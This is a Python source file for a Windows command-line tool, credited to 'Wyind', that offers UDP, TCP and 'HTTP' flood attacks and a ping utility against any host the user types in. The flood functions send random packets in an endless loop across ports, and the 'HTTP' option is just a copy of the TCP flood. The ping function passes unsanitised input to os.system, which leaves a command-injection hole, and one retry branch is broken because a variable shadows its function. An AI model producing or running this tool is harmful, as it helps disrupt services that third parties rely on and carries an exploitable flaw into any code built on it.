#create a program that uses socks to make a ddos and pinger.
#create the program for windows.

import socket
import os
import sys
import time
import random
import threading
import subprocess
import platform
import ctypes
import colorama
from colorama import Fore, Back, Style
from datetime import datetime
from time import sleep
from random import randint
from threading import Thread
from subprocess import Popen, PIPE
from platform import system
from ctypes import windll, Structure, c_ulong, byref

#colors
colorama.init()
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
magenta = Fore.MAGENTA
cyan = Fore.CYAN
white = Fore.WHITE
reset = Fore.RESET

#clear screen
def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

#banner
def banner():
    clear()
    print(f"""{red}\

    |  |__|  ||  |  ||    ||    \ |   \  
    |  |  |  ||  |  | |  | |  _  ||    \ 
    |  |  |  ||  ~  | |  | |  |  ||  D  |
    |  `  '  ||___, | |  | |  |  ||     |
     \      / |     | |  | |  |  ||     |
      \_/\_/  |____/ |____||__|__||_____|
                                     
    {green}Made by: Wyind {yellow}
    {green}Github: https://github.com/wyind {yellow}
    {green}Version: {yellow}2.1
    {green}Date: 12/7/2022 {yellow}""")
    print(f"{red}\
    {green}1. {yellow}DDoS Attack\
    {green}2. {yellow}Ping\
    {green}3. {yellow}Exit\
    ")

#ddos
def ddos():
    clear()
    print(f"{red}\
    {green}1. {yellow}UDP\
    {green}2. {yellow}TCP\
    {green}3. {yellow}HTTP\
    {green}4. {yellow}Back\
    ")
    ddos = input(f"{red}\
    {green}DDoS Attack > {yellow}")
    if ddos == "1":
        udp()
    elif ddos == "2":
        tcp()
    elif ddos == "3":
        http()
    elif ddos == "4":
        banner()
        main()
    else:
        ddos()

#udp
def udp():
    clear()
    host = input(f"{red}\
    {green}Host > {yellow}")
    port = int(input(f"{red}\
    {green}Port > {yellow}"))
    bytes = random._urandom(1490)
    sent = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(bytes, (host, port))
            sent = sent + 1
            port = port + 1
            print(f"{red}\
            {green}Sent {yellow}{sent} {green}packet to {yellow}{host} {green}through port {yellow}{port}")
            if port == 65534:
                port = 1
        except KeyboardInterrupt:
            banner()
            main()

#tcp
def tcp():
    clear()
    host = input(f"{red}\
    {green}Host > {yellow}")
    port = int(input(f"{red}\
    {green}Port > {yellow}"))
    bytes = random._urandom(1490)
    sent = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.send(bytes)
            sent = sent + 1
            port = port + 1
            print(f"{red}\
            {green}Sent {yellow}{sent} {green}packet to {yellow}{host} {green}through port {yellow}{port}")
            if port == 65534:
                port = 1
        except KeyboardInterrupt:
            banner()
            main()

#http
def http():
    clear()
    host = input(f"{red}\
    {green}Host > {yellow}")
    port = int(input(f"{red}\
    {green}Port > {yellow}"))
    bytes = random._urandom(1490)
    sent = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.send(bytes)
            sent = sent + 1
            port = port + 1
            print(f"{red}\
            {green}Sent {yellow}{sent} {green}packet to {yellow}{host} {green}through port {yellow}{port}")
            if port == 65534:
                port = 1
        except KeyboardInterrupt:
            banner()
            main()

#ping
def ping():
    clear()
    host = input(f"{red}\
    {green}Host > {yellow}")
    print(f"{red}\
    {green}Pinging {yellow}{host}...")
    response = os.system("ping -n 1 " + host)
    if response == 0:
        print(f"{red}\
        {green}{host} {yellow}is up!")
        sleep(2)
        banner()
        main()
    else:
        print(f"{red}\
        {green}{host} {yellow}is down!")
        sleep(2)
        banner()
        main()

#main
def main():
    choice = input(f"{red}\
    {green}Choice > {yellow}")
    if choice == "1":
        ddos()
    elif choice == "2":
        ping()
    elif choice == "3":
        exit()
    else:
        banner()
        main()

#start
if __name__ == "__main__":
    banner()
    main()

#end